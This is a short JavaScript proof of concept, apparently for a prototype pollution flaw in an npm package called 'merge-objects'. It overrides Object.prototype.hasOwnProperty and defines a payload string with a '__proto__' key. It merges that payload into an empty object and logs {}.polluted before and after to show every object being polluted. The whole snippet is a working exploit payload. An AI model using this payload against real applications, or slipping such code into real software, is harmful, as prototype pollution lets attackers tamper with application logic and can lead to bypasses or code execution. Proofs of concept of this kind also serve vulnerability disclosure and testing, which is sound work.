Object.prototype.hasOwnProperty = () => true;
const merge = require('merge-objects');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);